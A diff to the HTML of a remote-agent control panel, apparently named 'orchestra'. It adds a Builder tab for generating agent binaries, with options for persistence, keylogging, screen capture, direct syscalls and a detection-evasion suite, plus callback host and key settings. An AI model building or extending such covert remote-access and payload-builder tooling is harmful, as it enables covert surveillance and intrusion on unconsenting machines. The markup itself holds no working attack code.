@@ -35,34 +35,123 @@
   <p id="login-err" class="err"></p>
 </section>
 
-<section id="dash" hidden>
-  <h2>Connected agents <span class="muted" id="agent-count"></span></h2>
-  <table>
-    <thead><tr><th>Agent ID</th><th>Hostname / status</th><th>Peer</th><th>Last seen</th></tr></thead>
-    <tbody id="agents-tbody"><tr><td colspan="4" class="muted">No agents connected.</td></tr></tbody>
-  </table>
+<section id="main-content" hidden>
+  <nav id="tabs" style="margin-bottom: 1rem; border-bottom: 1px solid #ccc4; padding-bottom: 0.5rem;">
+    <button id="tab-btn-dash" class="tab-btn active" style="font-weight: bold;">Dashboard</button>
+    <button id="tab-btn-builder" class="tab-btn">Builder</button>
+  </nav>
 
-  <h2>Send command</h2>
-  <div class="row">
-    <label>Agent <select id="agent-select"></select></label>
-    <label>Command
-      <select id="cmd-select">
-        <option value="Ping">Ping</option>
-        <option value="GetSystemInfo">GetSystemInfo</option>
-        <option value="ListProcesses">ListProcesses</option>
-        <option value="ListDirectory">ListDirectory (path)</option>
-        <option value="ReadFile">ReadFile (path)</option>
-        <option value="RunApprovedScript">RunApprovedScript (name)</option>
-      </select>
-    </label>
-    <input id="cmd-arg" placeholder="argument (when applicable)">
-    <button id="send-btn">Send</button>
+  <div id="tab-dash">
+    <h2>Connected agents <span class="muted" id="agent-count"></span></h2>
+    <table>
+      <thead><tr><th>Agent ID</th><th>Hostname / status</th><th>Peer</th><th>Last seen</th></tr></thead>
+      <tbody id="agents-tbody"><tr><td colspan="4" class="muted">No agents connected.</td></tr></tbody>
+    </table>
+
+    <h2>Send command</h2>
+    <div class="row">
+      <label>Agent <select id="agent-select"></select></label>
+      <label>Command
+        <select id="cmd-select">
+          <option value="Ping">Ping</option>
+          <option value="GetSystemInfo">GetSystemInfo</option>
+          <option value="ListProcesses">ListProcesses</option>
+          <option value="ListDirectory">ListDirectory (path)</option>
+          <option value="ReadFile">ReadFile (path)</option>
+          <option value="RunApprovedScript">RunApprovedScript (name)</option>
+        </select>
+      </label>
+      <input id="cmd-arg" placeholder="argument (when applicable)">
+      <button id="send-btn">Send</button>
+    </div>
+    <h3>Last result</h3>
+    <pre id="result" class="muted">—</pre>
+
+    <h2>Audit stream</h2>
+    <pre id="audit"></pre>
   </div>
-  <h3>Last result</h3>
-  <pre id="result" class="muted">—</pre>
 
-  <h2>Audit stream</h2>
-  <pre id="audit"></pre>
+  <div id="tab-builder" hidden>
+    <h2>Agent Builder</h2>
+    <p class="muted">Configure and generate custom agent binaries.</p>
+    
+    <div style="display: grid; gap: 1rem; max-width: 600px; background: #8881; padding: 1rem; border-radius: 6px;">
+      <div class="row">
+        <label style="flex: 1">Target OS
+          <select id="build-os" style="width: 100%; margin-top: 0.25rem;">
+            <option value="windows">Windows</option>
+            <option value="linux" selected>Linux</option>
+            <option value="macos">macOS</option>
+          </select>
+        </label>
+        <label style="flex: 1">Target Architecture
+          <select id="build-arch" style="width: 100%; margin-top: 0.25rem;">
+            <option value="x86_64" selected>x86_64</option>
+            <option value="aarch64">aarch64</option>
+          </select>
+        </label>
+      </div>
+
+      <div>
+        <strong>Features</strong>
+        <div class="row" style="gap: 1rem; margin-top: 0.5rem;">
+          <label><input type="checkbox" id="feat-persistence" checked> Persistence</label>
+          <label><input type="checkbox" id="feat-syscalls"> Direct Syscalls</label>
+          <label><input type="checkbox" id="feat-screencap"> Screen Capture</label>
+          <label><input type="checkbox" id="feat-keylog"> Keylogging</label>
+          <label><input type="checkbox" id="feat-stealth"> Advanced Evasion Suite</label>
+          <small style="display:block;color:#888;margin-bottom:8px;">Enables the most robust detection-resistant behaviour (syscalls, OPSEC sleep, etc.)</small>
+        </div>
+      </div>
+
+      <div>
+        <strong>Connection Details</strong>
+        <div class="row">
+          <label style="flex: 2">Host / IP <input type="text" id="build-host" placeholder="orchestra.local" style="width: 100%; margin-top: 0.25rem;"></label>
+          <label style="flex: 1">Port <input type="number" id="build-port" value="443" style="width: 100%; margin-top: 0.25rem;"></label>
+        </div>
+        <div class="row">
+          <label style="flex: 1">TLS Certificate Fingerprint / CA Pin
+            <input type="text" id="build-pin" placeholder="sha256:..." style="width: 100%; margin-top: 0.25rem;">
+          </label>
+        </div>
+      </div>
+
+      <div>
+        <strong>Encryption / Signing Key</strong>
+        <div class="row">
+          <input type="text" id="build-key" placeholder="32-byte hex key..." style="flex: 1;">
+          <button id="btn-gen-key">Generate Random</button>
+        </div>
+      </div>
+
+      <div>
+        <strong>Output Directory (Optional)</strong>
+        <div class="row">
+          <input type="text" id="build-output-dir" placeholder="/var/lib/orchestra/builds" style="flex: 1; margin-top: 0.25rem;">
+        </div>
+      </div>
+
+      <button id="btn-build" style="font-weight: bold; margin-top: 0.5rem;">Build Agent</button>
+    </div>
+
+    <div style="margin-top: 1.5rem; max-width: 600px; background: #8881; padding: 1rem; border-radius: 6px;">
+      <strong>Profile Management (AES-256-GCM Encrypted)</strong>
+      <div class="row" style="margin-top: 0.5rem;">
+        <input type="password" id="profile-passphrase" placeholder="Encryption Passphrase" style="flex: 1;">
+        <button id="btn-export-profile">Export Profile</button>
+      </div>
+      <div class="row" style="margin-top: 0.5rem;">
+        <input type="file" id="profile-file" accept=".json,.enc" style="flex: 1;">
+        <button id="btn-import-profile">Import Profile</button>
+      </div>
+    </div>
+    <h3 style="margin-top: 1.5rem;">Build Status</h3>
+    <pre id="build-log" class="muted">Waiting to build...</pre>
+    <div id="build-download" style="margin-top: 1rem;" hidden>
+      <a id="build-download-link" href="#" download class="ok" style="font-weight: bold; text-decoration: underline;">⬇ Download Binary</a>
+    </div>
+  </div>
 </section>
 
 <script src="/app.js"></script>
